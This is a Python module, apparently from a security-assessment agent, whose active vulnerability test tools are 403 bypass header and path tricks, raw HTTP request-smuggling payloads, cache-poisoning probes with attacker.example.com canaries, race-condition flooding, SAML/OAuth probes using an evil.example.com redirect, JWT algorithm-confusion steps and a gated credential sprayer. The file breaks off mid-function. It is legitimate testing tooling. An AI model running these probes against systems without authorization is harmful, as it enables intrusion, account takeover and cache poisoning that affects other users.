"""Active vulnerability tests and workflows (403 bypass, smuggling, cache, race, SAML, spray, OOB).

Mixin for ASMToolsManager; methods moved verbatim from tools.py.
"""

from app.services.agent.tools_common import (
    Any,
    Dict,
    List,
    Optional,
    SessionLocal,
    Severity,
    Vulnerability,
    _re,
    _tool_output_max_chars,
    get_tenant_context,
    httpx,
    json,
    logger,
)


class ActiveTestToolsMixin:
    """Active vulnerability tests and workflows (403 bypass, smuggling, cache, race, SAML, spray, OOB)."""

    async def execute_llm_red_team(
        self,
        target_url: str,
        categories: Optional[List[str]] = None,
        endpoint_url: Optional[str] = None,
        message_field: Optional[str] = None,
        auto_discover: bool = True,
        max_payloads: Optional[int] = None,
        create_findings: bool = True,
        **kwargs: Any,
    ) -> str:
        """Run LLM red team scan against chatbot/AI endpoints on a target URL. Tests for prompt injection, jailbreak, data exfiltration, SSRF, excessive agency, tool_enumeration (enumerate agent tools then abuse params), and more. Optionally auto-discovers chat endpoints. If endpoint_url is provided, it will be tested directly. categories = prompt_injection|system_prompt_leakage|data_exfiltration|jailbreak|ssrf_tool_abuse|excessive_agency|tool_enumeration|hallucination|harmful_content (comma-separated or list; omit for all). Returns a formatted report of findings."""
        from app.services.llm_red_team.scanner import (
            run_scan, ScanConfig, ChatEndpoint, format_scan_report, build_finding_data,
        )
        _, org_id = get_tenant_context()

        cat_list = None
        if categories:
            if isinstance(categories, str):
                cat_list = [c.strip() for c in categories.split(",")]
            else:
                cat_list = list(categories)

        endpoints = []
        if endpoint_url:
            endpoints.append(ChatEndpoint(
                url=endpoint_url.strip(),
                message_field=message_field or "message",
                detected_by="agent",
            ))

        config = ScanConfig(
            target_url=target_url.strip(),
            endpoints=endpoints,
            categories=cat_list,
            auto_discover=auto_discover,
            use_llm_grading=True,
            max_payloads=int(max_payloads) if max_payloads else None,
        )

        try:
            scan_result = await run_scan(config)
        except Exception as e:
            logger.exception("LLM red team scan failed")
            return f"Error running LLM red team scan: {e}"

        from app.services.agent.prowl_revalidation import revalidation_only

        if create_findings and revalidation_only.get():
            create_findings = False  # re-validation runs never publish
        if create_findings and org_id and scan_result.vulnerabilities_found > 0:
            db = SessionLocal()
            try:
                created_count = 0
                for test_result in scan_result.results:
                    if test_result.get("verdict") != "fail":
                        continue
                    finding_data = build_finding_data(test_result, target_url)
                    asset = self._get_or_create_asset(db, org_id, target_url.strip())
                    if not asset.id or db.is_modified(asset):
                        db.flush()
                    sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH, "medium": Severity.MEDIUM, "low": Severity.LOW, "info": Severity.INFO}
                    vuln = Vulnerability(
                        title=finding_data["title"][:500],
                        description=finding_data.get("description", "")[:10000],
                        severity=sev_map.get(finding_data.get("severity", "medium"), Severity.MEDIUM),
                        asset_id=asset.id,
                        detected_by="llm_red_team",
                        template_id=finding_data.get("template_id"),
                        evidence=finding_data.get("evidence", "")[:5000],
                        cwe_id=finding_data.get("cwe_id"),
                        remediation=finding_data.get("remediation", "")[:5000],
                        tags=finding_data.get("tags", []),
                        metadata_=finding_data.get("metadata", {}),
                    )
                    db.add(vuln)
                    created_count += 1
                db.commit()
                logger.info(f"LLM red team: created {created_count} findings for {target_url}")
            except Exception as e:
                db.rollback()
                logger.exception("Failed to create LLM red team findings")
                scan_result.errors.append(f"Finding creation error: {e}")
            finally:
                db.close()

        report = format_scan_report(scan_result)
        max_chars = _tool_output_max_chars()
        if len(report) > max_chars:
            report = report[:max_chars] + "\n\n... (truncated)"
        return report

    async def bypass_403(
        self,
        url: str,
        techniques: Optional[List[str]] = None,
        additional_headers: Optional[Dict[str, str]] = None,
        timeout: int = 15,
    ) -> str:
        """Test for 403/401/302 access restriction bypasses via header tricks,
        path normalization, and method overrides.

        Args:
            url: The restricted URL to test (must return 403/401/302 normally).
            techniques: Subset of bypass classes to run. Options:
                        ip_headers, path_tricks, method_override, protocol_headers.
                        Omit to run all.
            additional_headers: Extra headers to include in every probe (e.g. auth cookies).
            timeout: Per-request timeout in seconds.
        """
        from urllib.parse import urlparse, urlunparse
        import asyncio as _asyncio

        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = f"https://{url}"

        all_techniques = {"ip_headers", "path_tricks", "method_override", "protocol_headers"}
        active = set(techniques or all_techniques) & all_techniques

        base_headers = dict(additional_headers or {})
        base_headers.setdefault("User-Agent", "Mozilla/5.0 (Security Assessment)")

        parsed = urlparse(url)
        path = parsed.path or "/"

        probes: List[Dict[str, Any]] = []

        if "ip_headers" in active:
            ip_bypass_headers = [
                {"X-Forwarded-For": "127.0.0.1"},
                {"X-Real-IP": "127.0.0.1"},
                {"X-Originating-IP": "127.0.0.1"},
                {"X-Remote-IP": "127.0.0.1"},
                {"X-Client-IP": "127.0.0.1"},
                {"True-Client-IP": "127.0.0.1"},
                {"CF-Connecting-IP": "127.0.0.1"},
                {"X-Forwarded-For": "::1"},
                {"X-Forwarded-For": "0.0.0.0"},
            ]
            for hdr in ip_bypass_headers:
                probes.append({"label": f"IP header: {list(hdr.keys())[0]}={list(hdr.values())[0]}", "url": url, "headers": {**base_headers, **hdr}, "method": "GET"})

        if "path_tricks" in active:
            path_variants = [
                path + "/",
                path + "/..",
                "/" + path.lstrip("/"),
                path + "%20",
                path + "%09",
                path.replace("/", "//", 1),
                path + "#",
                path + "?",
                _re.sub(r"^(/[^/])", lambda m: "/" + m.group(1), path),
            ]
            # URL-encode first char of last segment
            parts = path.rsplit("/", 1)
            if len(parts) == 2 and parts[1]:
                enc_path = parts[0] + "/" + "%" + format(ord(parts[1][0]), "02X") + parts[1][1:]
                path_variants.append(enc_path)
            for vpath in path_variants:
                vurl = urlunparse(parsed._replace(path=vpath))
                probes.append({"label": f"Path trick: {vpath}", "url": vurl, "headers": base_headers, "method": "GET"})

        if "method_override" in active:
            method_hdrs = [
                {"X-HTTP-Method-Override": "GET"},
                {"X-Method-Override": "GET"},
                {"X-HTTP-Method": "GET"},
            ]
            for hdr in method_hdrs:
                probes.append({"label": f"Method override: {list(hdr.keys())[0]}", "url": url, "headers": {**base_headers, **hdr}, "method": "POST"})
            probes.append({"label": "Method: HEAD", "url": url, "headers": base_headers, "method": "HEAD"})

        if "protocol_headers" in active:
            proto_hdrs = [
                {"X-Forwarded-Proto": "https"},
                {"X-Forwarded-Scheme": "https"},
                {"X-Forwarded-Host": parsed.netloc},
                {"X-Original-URL": path},
                {"X-Rewrite-URL": path},
            ]
            for hdr in proto_hdrs:
                probes.append({"label": f"Protocol header: {list(hdr.keys())[0]}", "url": url, "headers": {**base_headers, **hdr}, "method": "GET"})

        # Baseline request
        baseline_status = None
        baseline_length = 0
        try:
            async with httpx.AsyncClient(timeout=timeout, follow_redirects=False, verify=False) as client:
                br = await client.get(url, headers=base_headers)
                baseline_status = br.status_code
                baseline_length = len(br.content)
        except Exception as e:
            return json.dumps({"error": f"Baseline request failed: {e}"}, indent=2)

        results: List[Dict[str, Any]] = []

        async def probe_one(p: Dict) -> Dict:
            try:
                async with httpx.AsyncClient(timeout=timeout, follow_redirects=False, verify=False) as client:
                    method = p.get("method", "GET")
                    if method == "POST":
                        resp = await client.post(p["url"], headers=p["headers"])
                    elif method == "HEAD":
                        resp = await client.head(p["url"], headers=p["headers"])
                    else:
                        resp = await client.get(p["url"], headers=p["headers"])
                    return {
                        "label": p["label"],
                        "status": resp.status_code,
                        "length": len(resp.content),
                        "bypassed": resp.status_code not in (401, 403, 302) and resp.status_code < 400,
                    }
            except Exception as ex:
                return {"label": p["label"], "status": "error", "length": 0, "bypassed": False, "error": str(ex)}

        results = await _asyncio.gather(*[probe_one(p) for p in probes])

        bypasses = [r for r in results if r.get("bypassed")]
        return json.dumps({
            "url": url,
            "baseline_status": baseline_status,
            "baseline_length": baseline_length,
            "probes_run": len(probes),
            "bypasses_found": len(bypasses),
            "bypasses": bypasses,
            "all_results": list(results),
        }, indent=2)[:_tool_output_max_chars()]

    async def test_request_smuggling(
        self,
        url: str,
        technique: str = "all",
        timeout: int = 20,
    ) -> str:
        """Probe for HTTP/1.1 request smuggling via timing-based CL.TE and TE.CL
        detection, plus TE.TE obfuscation variants.

        Uses raw TCP/TLS sockets to send precisely crafted requests that bypass
        HTTP client normalization. Timing differences of >5 s indicate a
        vulnerable desync condition.

        Args:
            url: Target base URL (scheme://host[:port]).
            technique: cl_te | te_cl | te_te | all (default).
            timeout: Socket timeout in seconds for the timing probe.
        """
        import asyncio as _asyncio
        import ssl as _ssl
        import time as _time
        from urllib.parse import urlparse as _urlparse

        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = f"https://{url}"

        parsed = _urlparse(url)
        host = parsed.hostname or ""
        use_tls = parsed.scheme == "https"
        port = parsed.port or (443 if use_tls else 80)
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        active = {"cl_te", "te_cl", "te_te"} if technique == "all" else {technique}
        findings: List[Dict[str, Any]] = []

        async def raw_send(payload: bytes, label: str) -> Dict[str, Any]:
            start = _time.monotonic()
            try:
                if use_tls:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    reader, writer = await _asyncio.wait_for(
                        _asyncio.open_connection(host, port, ssl=ctx), timeout=timeout
                    )
                else:
                    reader, writer = await _asyncio.wait_for(
                        _asyncio.open_connection(host, port), timeout=timeout
                    )
                writer.write(payload)
                await writer.drain()
                try:
                    data = await _asyncio.wait_for(reader.read(4096), timeout=timeout)
                    elapsed = _time.monotonic() - start
                    status_line = data.decode("utf-8", errors="replace").splitlines()[0] if data else ""
                    writer.close()
                    return {"label": label, "elapsed_s": round(elapsed, 2), "status_line": status_line, "timed_out": False}
                except _asyncio.TimeoutError:
                    elapsed = _time.monotonic() - start
                    writer.close()
                    return {"label": label, "elapsed_s": round(elapsed, 2), "status_line": "TIMEOUT", "timed_out": True}
            except Exception as ex:
                return {"label": label, "elapsed_s": round(_time.monotonic() - start, 2), "status_line": f"ERROR: {ex}", "timed_out": False}

        if "cl_te" in active:
            # CL.TE timing probe: CL says 4 bytes but body has incomplete chunked body.
            # A TE-speaking backend will wait for the continuation → detectable timeout.
            body = b"1\r\nZ\r\nQ"
            req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: keep-alive\r\n\r\n"
            ).encode() + body
            r = await raw_send(req, "CL.TE timing probe")
            r["technique"] = "CL.TE"
            r["vulnerable"] = r["timed_out"]
            r["note"] = ("Timeout indicates backend uses Transfer-Encoding — CL.TE desync likely."
                         if r["timed_out"] else "No timeout detected for CL.TE.")
            findings.append(r)

        if "te_cl" in active:
            # TE.CL timing probe: sends a 0-chunk then extra data; CL-speaking backend waits.
            body = b"0\r\n\r\nX"
            req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 6\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: keep-alive\r\n\r\n"
            ).encode() + body
            r = await raw_send(req, "TE.CL timing probe")
            r["technique"] = "TE.CL"
            r["vulnerable"] = r["timed_out"]
            r["note"] = ("Timeout indicates backend uses Content-Length — TE.CL desync likely."
                         if r["timed_out"] else "No timeout detected for TE.CL.")
            findings.append(r)

        if "te_te" in active:
            # TE.TE: two Transfer-Encoding headers, one obfuscated; only one side de-obfuscates.
            obfuscations = [
                b"Transfer-Encoding: xchunked\r\n",
                b"Transfer-Encoding : chunked\r\n",
                b"Transfer-Encoding: chunked\r\nTransfer-encoding: x\r\n",
                b"Transfer-Encoding:\tchunked\r\n",
                b'Transfer-Encoding: "chunked"\r\n',
            ]
            for obf in obfuscations:
                body = b"0\r\n\r\n"
                req = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 5\r\n"
                ).encode() + b"Transfer-Encoding: chunked\r\n" + obf + b"\r\n" + body
                label = f"TE.TE — {obf.decode('utf-8', errors='replace').strip()}"
                r = await raw_send(req, label)
                r["technique"] = "TE.TE"
                r["vulnerable"] = r["timed_out"]
                r["note"] = ("Timeout with TE.TE obfuscation — one side misparses the TE header."
                             if r["timed_out"] else "No timeout for this TE.TE variant.")
                findings.append(r)

        vulnerable = [f for f in findings if f.get("vulnerable")]
        return json.dumps({
            "url": url,
            "host": host,
            "techniques_tested": list(active),
            "probe_count": len(findings),
            "vulnerable_probes": len(vulnerable),
            "verdict": "LIKELY VULNERABLE" if vulnerable else "Not detected",
            "findings": findings,
            "next_steps": (
                ["Confirm with a differential attack (poison a victim's next request).",
                 "Use Burp Suite's HTTP Request Smuggler extension for deep confirmation.",
                 "Test with execute_curl for response differential if timing is inconclusive."]
                if vulnerable else
                ["No timing-based desync detected. Target may use HTTP/2 or sanitize headers.",
                 "Try HTTP/2 downgrade smuggling (H2.CL / H2.TE) if the site supports HTTP/2."]
            ),
        }, indent=2)[:_tool_output_max_chars()]

    async def test_cache_poisoning(
        self,
        url: str,
        probe_headers: Optional[List[str]] = None,
        timeout: int = 15,
    ) -> str:
        """Probe for web cache poisoning via unkeyed header injection.

        Sends requests with canary values in common unkeyed headers, then
        re-fetches without those headers to check if the canary is reflected
        in a cached response. Also checks for unkeyed query parameter and
        fat GET attack vectors.

        Args:
            url: Target URL to probe.
            probe_headers: List of header names to probe. Defaults to a
                           comprehensive set of known unkeyed headers.
            timeout: Per-request timeout in seconds.
        """
        import uuid as _uuid
        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = f"https://{url}"

        canary = f"cp-{_uuid.uuid4().hex[:12]}"

        default_headers = [
            "X-Forwarded-Host",
            "X-Host",
            "X-HTTP-Host-Override",
            "Forwarded",
            "X-Forwarded-Scheme",
            "X-Forwarded-Port",
            "X-Forwarded-For",
            "X-Original-URL",
            "X-Rewrite-URL",
            "X-Forwarded-Prefix",
            "X-Forwarded-Proto",
        ]
        headers_to_probe = probe_headers or default_headers

        results: List[Dict[str, Any]] = []

        def busted(base: str) -> str:
            # Every probe uses its own cache key. Without a unique cache-buster a
            # positive probe would poison the live entry served to real users.
            from urllib.parse import urlencode, urlsplit, urlunsplit

            parts = urlsplit(base)
            extra = urlencode({"prowlcb": _uuid.uuid4().hex[:16]})
            query = f"{parts.query}&{extra}" if parts.query else extra
            return urlunsplit(parts._replace(query=query))

        async def probe_header(header_name: str) -> Dict[str, Any]:
            canary_value = f"{canary}.attacker.example.com" if "host" in header_name.lower() else canary
            probe_hdrs = {header_name: canary_value, "Cache-Control": "no-cache", "Pragma": "no-cache"}
            probe_url = busted(url)
            try:
                async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=False) as client:
                    # Poison probe on a unique cache key
                    r1 = await client.get(probe_url, headers={**probe_hdrs, "User-Agent": "Mozilla/5.0 (Security Assessment)"})
                    body1 = r1.text[:4000]
                    reflected_in_poison = canary in body1 or canary_value in body1
                    cache_status_poison = r1.headers.get("X-Cache", r1.headers.get("CF-Cache-Status", "unknown"))

                    # Re-fetch the same unique key without the probe header
                    r2 = await client.get(probe_url, headers={"User-Agent": "Mozilla/5.0 (Victim Simulation)"})
                    body2 = r2.text[:4000]
                    reflected_in_clean = canary in body2 or canary_value in body2
                    cache_status_clean = r2.headers.get("X-Cache", r2.headers.get("CF-Cache-Status", "unknown"))

                    poisoned = reflected_in_clean and reflected_in_poison
                    return {
                        "header": header_name,
                        "canary_value": canary_value,
                        "poison_status": r1.status_code,
                        "poison_cache_status": cache_status_poison,
                        "reflected_in_poison_response": reflected_in_poison,
                        "clean_status": r2.status_code,
                        "clean_cache_status": cache_status_clean,
                        "reflected_in_clean_response": reflected_in_clean,
                        "potentially_poisoned": poisoned,
                        "note": (
                            "CANARY REFLECTED IN CLEAN FETCH — cache may be poisoned!" if poisoned else
                            "Canary reflected in poison response only — header is unkeyed but cache not confirmed." if reflected_in_poison else
                            "Canary not reflected."
                        ),
                    }
            except Exception as ex:
                return {"header": header_name, "error": str(ex), "potentially_poisoned": False}

        import asyncio as _asyncio
        results = list(await _asyncio.gather(*[probe_header(h) for h in headers_to_probe]))

        # Fat GET probe: inject query param into body for GET request
        fat_get_result = None
        try:
            async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=False) as client:
                r = await client.request("GET", busted(url), content=f"utm_content={canary}",
                                         headers={"Content-Length": str(len(f"utm_content={canary}")),
                                                  "Content-Type": "application/x-www-form-urlencoded"})
                fat_get_result = {"reflected": canary in r.text, "status": r.status_code}
        except Exception:
            fat_get_result = {"reflected": False, "status": "error"}

        confirmed = [r for r in results if r.get("potentially_poisoned")]
        candidates = [r for r in results if r.get("reflected_in_poison_response") and not r.get("potentially_poisoned")]

        return json.dumps({
            "url": url,
            "canary": canary,
            "headers_probed": len(headers_to_probe),
            "confirmed_poisoning": len(confirmed),
            "unkeyed_header_candidates": len(candidates),
            "fat_get_canary_reflected": fat_get_result.get("reflected", False),
            "confirmed": confirmed,
            "candidates": candidates,
            "all_results": results,
            "verdict": (
                "UNKEYED INPUT SERVED FROM CACHE (lead: verify independently)" if confirmed else
                "UNKEYED HEADERS FOUND — manual confirmation needed" if candidates else
                "No cache poisoning indicators detected"
            ),
        }, indent=2)[:_tool_output_max_chars()]

    async def test_race_condition(
        self,
        url: str,
        method: str = "POST",
        concurrency: int = 15,
        body: Optional[Dict[str, Any]] = None,
        auth_headers: Optional[Dict[str, str]] = None,
        expected_unique_field: Optional[str] = None,
        timeout: int = 30,
    ) -> str:
        """Fire N concurrent requests to detect race conditions (TOCTOU flaws).

        Useful for testing: coupon/voucher single-use enforcement, balance
        deductions, inventory limits, rate limit bypasses, and idempotency.

        Args:
            url: Target endpoint URL.
            method: HTTP method (GET/POST/PUT/PATCH, default POST).
            concurrency: Number of simultaneous requests (default 15, max 50).
            body: JSON body dict to send with each request.
            auth_headers: Authentication headers (Bearer token, Cookie, etc.).
            expected_unique_field: JSON response field to check for uniqueness
                                   across responses (e.g. "transaction_id").
            timeout: Total timeout in seconds.
        """
        import asyncio as _asyncio
        import time as _time

        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = f"https://{url}"

        concurrency = max(2, min(50, int(concurrency or 15)))
        method = (method or "POST").upper()
        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Race Condition Test)"}
        if auth_headers:
            headers.update(auth_headers)

        responses: List[Dict[str, Any]] = []
        start = _time.monotonic()

        async def one_request(idx: int) -> Dict[str, Any]:
            try:
                async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
                    req_start = _time.monotonic()
                    if method in ("POST", "PUT", "PATCH"):
                        resp = await client.request(method, url, json=body, headers=headers)
                    else:
                        resp = await client.get(url, headers=headers)
                    elapsed = round(_time.monotonic() - req_start, 3)
                    try:
                        resp_body = resp.json()
                    except Exception:
                        resp_body = resp.text[:500]
                    return {
                        "idx": idx, "status": resp.status_code,
                        "elapsed_s": elapsed, "body": resp_body,
                        "unique_field": (resp_body.get(expected_unique_field) if isinstance(resp_body, dict) and expected_unique_field else None),
                    }
            except Exception as ex:
                return {"idx": idx, "status": "error", "elapsed_s": 0.0, "body": str(ex), "unique_field": None}

        # Fire all requests concurrently (Last Byte Sync — all requests start as close together as possible)
        responses = list(await _asyncio.gather(*[one_request(i) for i in range(concurrency)]))
        total_elapsed = round(_time.monotonic() - start, 2)

        status_counter: Dict[str, int] = {}
        for r in responses:
            k = str(r["status"])
            status_counter[k] = status_counter.get(k, 0) + 1

        success_responses = [r for r in responses if isinstance(r["status"], int) and r["status"] < 300]

        unique_field_values = [r["unique_field"] for r in responses if r.get("unique_field") is not None]
        duplicate_field_values = len(unique_field_values) != len(set(str(v) for v in unique_field_values))

        race_indicators = []
        if len(success_responses) > 1:
            race_indicators.append(f"{len(success_responses)}/{concurrency} requests succeeded (expected ≤1 for single-use resources).")
        if duplicate_field_values and unique_field_values:
            race_indicators.append(f"Duplicate values in '{expected_unique_field}' field — uniqueness constraint may be broken.")
        if len(set(str(r["status"]) for r in responses)) > 2:
            race_indicators.append("Inconsistent status codes across concurrent requests — non-deterministic state detected.")

        return json.dumps({
            "url": url,
            "method": method,
            "concurrency": concurrency,
            "total_elapsed_s": total_elapsed,
            "status_distribution": status_counter,
            "success_count": len(success_responses),
            "race_indicators": race_indicators,
            "verdict": "RACE CONDITION INDICATORS FOUND" if race_indicators else "No race condition indicators detected",
            "responses": responses,
            "next_steps": (
                ["Run with higher concurrency (30-50) to increase pressure.",
                 "Try with last-byte-sync: pre-connect, send all but last byte, then flush simultaneously.",
                 "Focus on state-changing endpoints: balance, coupon, invite, vote, order."]
                if not race_indicators else
                ["Confirm with a controlled experiment showing state inconsistency.",
                 "Document the duplicated field values or multiple successes as evidence.",
                 "Recommend atomic DB operations or distributed locks as remediation."]
            ),
        }, indent=2)[:_tool_output_max_chars()]

    async def test_saml_sso(
        self,
        url: str,
        categories: Optional[List[str]] = None,
        saml_response_b64: Optional[str] = None,
        timeout: int = 20,
    ) -> str:
        """Probe for SAML/SSO/OAuth misconfigurations and known attack vectors.

        Performs passive endpoint discovery + active probing for common
        authentication bypass techniques. Does NOT attempt credential theft.

        Categories: xml_injection, signature_wrapping, oauth_bypass,
                    jwt_confusion, oidc_misconfig, saml_endpoints.
                    Omit to run all.

        Args:
            url: Base URL of the target application.
            categories: Subset of test categories to run.
            saml_response_b64: Optional base64-encoded SAMLResponse to
                               analyze for signature validation weaknesses.
            timeout: Per-request timeout in seconds.
        """
        import base64 as _b64
        import xml.etree.ElementTree as _ET

        url = url.strip().rstrip("/")
        if not url.startswith(("http://", "https://")):
            url = f"https://{url}"

        all_cats = {"xml_injection", "signature_wrapping", "oauth_bypass", "jwt_confusion", "oidc_misconfig", "saml_endpoints"}
        active = set(categories or all_cats) & all_cats

        findings: List[Dict[str, Any]] = []
        probes_run = 0

        # 1. SAML endpoint discovery
        if "saml_endpoints" in active:
            saml_paths = [
                "/saml/consume", "/saml/acs", "/auth/saml/callback",
                "/sso/saml", "/api/auth/saml", "/saml2/acs",
                "/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
                "/oauth/authorize", "/oauth2/authorize", "/connect/authorize",
                "/auth/realms/", "/auth/oauth2/callback", "/login/oauth/callback",
            ]
            discovered_endpoints: List[str] = []
            async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=False) as client:
                for p in saml_paths:
                    probes_run += 1
                    try:
                        r = await client.get(f"{url}{p}")
                        if r.status_code not in (404, 410):
                            discovered_endpoints.append(f"{p} → HTTP {r.status_code}")
                    except Exception:
                        pass
            if discovered_endpoints:
                findings.append({
                    "category": "saml_endpoints",
                    "severity": "info",
                    "title": f"Discovered {len(discovered_endpoints)} auth-related endpoints",
                    "detail": discovered_endpoints,
                })

        # 2. OAuth state parameter check
        if "oauth_bypass" in active:
            oauth_paths = ["/oauth/authorize", "/oauth2/authorize", "/connect/authorize", "/auth/realms/"]
            async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=False) as client:
                for p in oauth_paths:
                    probes_run += 1
                    try:
                        r = await client.get(f"{url}{p}?response_type=code&client_id=test&redirect_uri=https://evil.example.com")
                        if r.status_code in (200, 302, 400):
                            location = r.headers.get("location", "")
                            if "evil.example.com" in location:
                                findings.append({
                                    "category": "oauth_bypass",
                                    "severity": "high",
                                    "title": "Open OAuth Redirect — redirect_uri not validated",
                                    "detail": f"Request to {p} redirected to attacker-controlled evil.example.com. Allows OAuth token theft.",
                                    "evidence": f"Location: {location[:200]}",
                                })
                            elif r.status_code == 200 and "state" not in r.text.lower():
                                findings.append({
                                    "category": "oauth_bypass",
                                    "severity": "medium",
                                    "title": "OAuth authorize endpoint responded — verify state parameter enforcement",
                                    "detail": f"{p} returned 200 without state parameter rejection.",
                                })
                    except Exception:
                        pass

        # 3. OIDC discovery misconfiguration
        if "oidc_misconfig" in active:
            probes_run += 1
            try:
                async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
                    r = await client.get(f"{url}/.well-known/openid-configuration")
                    if r.status_code == 200:
                        try:
                            oidc = r.json()
                            issues: List[str] = []
                            if oidc.get("claims_supported") and "email" in oidc.get("claims_supported", []):
                                issues.append("email claim available — verify unique_claim enforcement to prevent account takeover via email match")
                            algos = oidc.get("id_token_signing_alg_values_supported", [])
                            if "none" in algos:
                                issues.append("alg=none supported in id_token — JWT signature bypass possible")
                            if "HS256" in algos:
                                issues.append("HS256 supported alongside RS256 — test for algorithm confusion attack")
                            if issues:
                                findings.append({
                                    "category": "oidc_misconfig",
                                    "severity": "high",
                                    "title": "OIDC Configuration Weaknesses Detected",
                                    "detail": issues,
                                    "oidc_url": f"{url}/.well-known/openid-configuration",
                                })
                        except Exception:
                            pass
            except Exception:
                pass

        # 4. SAMLResponse analysis (if provided)
        if "signature_wrapping" in active and saml_response_b64:
            try:
                decoded = _b64.b64decode(saml_response_b64).decode("utf-8", errors="replace")
                saml_issues: List[str] = []
                if "ds:Signature" not in decoded and "Signature" not in decoded:
                    saml_issues.append("No XML Signature found — response may not be verified")
                if decoded.count("<saml:Assertion") > 1:
                    saml_issues.append("Multiple Assertion elements — possible XSW (XML Signature Wrapping) attack surface")
                if "NotOnOrAfter" not in decoded:
                    saml_issues.append("Missing NotOnOrAfter time constraint — token replay may be possible")
                if "<ds:Reference" in decoded and 'URI=""' in decoded:
                    saml_issues.append("Signature covers empty URI — may allow wrapping attack by adding unsigned assertion")
                try:
                    root = _ET.fromstring(decoded)
                    ns_map = {v: k for k, v in dict(root.nsmap).items()} if hasattr(root, "nsmap") else {}
                except Exception:
                    ns_map = {}
                if saml_issues:
                    findings.append({
                        "category": "signature_wrapping",
                        "severity": "critical",
                        "title": "SAMLResponse Signature Issues Found",
                        "detail": saml_issues,
                        "raw_length": len(decoded),
                    })
                else:
                    findings.append({
                        "category": "signature_wrapping",
                        "severity": "info",
                        "title": "SAMLResponse appears correctly signed",
                        "detail": "No obvious signature wrapping indicators. Manual review recommended.",
                    })
            except Exception as ex:
                findings.append({"category": "signature_wrapping", "severity": "info", "title": "SAMLResponse parse error", "detail": str(ex)})

        # 5. JWT algorithm confusion discovery hint
        if "jwt_confusion" in active:
            findings.append({
                "category": "jwt_confusion",
                "severity": "info",
                "title": "JWT Algorithm Confusion — Manual Test Required",
                "detail": [
                    "Capture a valid JWT from the application.",
                    "Decode the header — note the 'alg' field (RS256, ES256, etc.).",
                    "Fetch the public key from JWKS endpoint (/.well-known/jwks.json or /auth/keys).",
                    "Re-sign the token using the public key as the HMAC-SHA256 secret (alg: HS256).",
                    "If accepted, the server is vulnerable to algorithm confusion (CVE class).",
                    "Tools: jwt_tool.py, python-jwt, or Burp JWT Editor extension.",
                ],
            })

        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        findings.sort(key=lambda f: severity_order.get(f.get("severity", "info"), 5))

        return json.dumps({
            "url": url,
            "categories_tested": list(active),
            "probes_run": probes_run,
            "findings_count": len(findings),
            "high_or_critical": len([f for f in findings if f.get("severity") in ("critical", "high")]),
            "findings": findings,
        }, indent=2)[:_tool_output_max_chars()]

    async def test_credential_spray(
        self,
        login_url: str,
        usernames: List[str],
        passwords: List[str],
        username_field: str = "username",
        password_field: str = "password",
        max_attempts: int = 10,
        delay_seconds: float = 2.0,
        success_indicators: Optional[List[str]] = None,
        failure_indicators: Optional[List[str]] = None,
        authorized: bool = False,
    ) -> str:
        """Credential spray test — requires explicit authorization flag.

        Sends login requests with provided credentials, stops at max_attempts
        (hard cap: 20), detects lockout/rate-limiting, and reports hits.

        LEGAL GUARDRAIL: authorized=True MUST be set; the tool refuses
        otherwise. Only use against systems you have explicit written
        permission to test.

        Args:
            login_url: URL of the login endpoint.
            usernames: List of usernames to test.
            passwords: List of passwords to spray (1 password per user is safer).
            username_field: Form/JSON field name for username (default 'username').
            password_field: Form/JSON field name for password (default 'password').
            max_attempts: Hard stop — maximum total login attempts (capped at 20).
            delay_seconds: Delay between each attempt in seconds (minimum 1.0).
            success_indicators: Strings whose presence in the response indicates success.
            failure_indicators: Strings that confirm a failed attempt.
            authorized: MUST be True to proceed. Required legal guardrail.
        """
        import asyncio as _asyncio

        if not authorized:
            return json.dumps({
                "error": "AUTHORIZATION REQUIRED",
                "detail": (
                    "test_credential_spray refused to run. You MUST set authorized=True and "
                    "have explicit written permission to test this system. "
                    "Unauthorized credential testing is illegal under the CFAA, CMA, and similar laws."
                ),
            }, indent=2)

        login_url = login_url.strip()
        if not login_url.startswith(("http://", "https://")):
            login_url = f"https://{login_url}"

        max_attempts = max(1, min(20, int(max_attempts or 10)))
        delay_seconds = max(1.0, float(delay_seconds or 2.0))

        default_success = ["dashboard", "logout", "welcome", "account", "/home", "token", "access_token"]
        default_failure = ["invalid", "incorrect", "wrong", "failed", "error", "locked", "too many"]
        success_ind = success_indicators or default_success
        failure_ind = failure_indicators or default_failure

        results: List[Dict[str, Any]] = []
        attempts = 0
        lockout_detected = False

        for username in usernames:
            for password in passwords:
                if attempts >= max_attempts:
                    results.append({"note": f"Hard stop reached at {max_attempts} attempts."})
                    break
                if lockout_detected:
                    results.append({"note": "Lockout detected — stopping spray to avoid account lockout."})
                    break
                await _asyncio.sleep(delay_seconds)
                try:
                    payload = {username_field: username, password_field: password}
                    async with httpx.AsyncClient(timeout=15, verify=False, follow_redirects=True) as client:
                        resp = await client.post(login_url, json=payload,
                                                 headers={"Content-Type": "application/json",
                                                          "User-Agent": "Mozilla/5.0 (Authorized Security Test)"})
                        body = resp.text[:2000]
                        body_lower = body.lower()
                        success = (resp.status_code in (200, 302) and
